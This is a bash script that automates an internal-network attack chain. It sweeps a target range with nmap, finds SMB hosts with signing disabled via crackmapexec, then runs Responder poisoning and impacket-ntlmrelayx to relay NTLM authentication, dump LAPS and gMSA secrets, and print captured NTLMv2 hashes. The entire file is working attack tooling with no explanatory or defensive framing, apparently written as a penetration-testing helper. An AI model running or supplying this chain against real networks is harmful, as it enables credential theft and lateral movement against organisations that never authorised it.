#!/bin/bash

#Creating Output Folders
mkdir -p output/nmap output/list

#NMAP PE SCAN

echo 'NMAP PE Scan'
nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA output/pe $1 > /dev/null 2>&1
echo ''
echo 'Done'

#Piping the IP-Addresses of the Targets to a file
awk '/Up/ {print$2}' output/pe.gnmap > output/ips.txt
echo ''

#NMAP Portscan for port 445
echo 'NMAP Portscan 445'
nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA output/445 -iL output/ips.txt > /dev/null 2>&1
echo ''
echo 'Done'

#Piping IP's with 445 open to a file
awk '/open/ {print$2}' output/445.gnmap > output/445_open.txt
echo ''

#Using Crackmap to Check which of the IP's with 445 open have Signing:false
echo 'Generating Relay List'
crackmapexec smb output/445_open.txt --gen-relay-list output/smb_sign_off.txt > /dev/null 2>&1
echo 'Done'

#When Clients with Signing:false exist
if [ -s output/smb_sign_off.txt ] 
	then
	echo ''
	
	#Responder with 300sec timeout in bg
	echo 'Starting Responder'
	timeout 300 /root/tools/Responder/Responder.py -I eth0 -rdwv > /dev/null 2>&1 &
	echo ''
	echo 'Done'
	echo ''

	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
	echo 'Starting NTLM-Relay'
	timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l loot -of output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf output/smb_sign_off.txt > /dev/null 2>&1 &
	echo ''

	#Declaring variables for each PID of Responder and NTLMRelayX
	echo 'Waiting for Hashes'

	PID_RESPONDER=`jobs -l | awk '/Responder/ {print$2}'`
	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`

	#Waiting for Jobs to despawn
	wait $PID_RESPONDER
	wait $PID_RELAY
	
	#When Output-File exists and is not empty
	if [ -s output/ntlm_relay_ntlmv2.txt ]
		then
		#Show me 'dem Hashes
		cat output/ntlm_relay_ntlmv2.txt

		else
		echo 'No Hashes Found'
	fi
else
	echo 'Either Signing is ON everywhere or no SMB Service available.'
fi


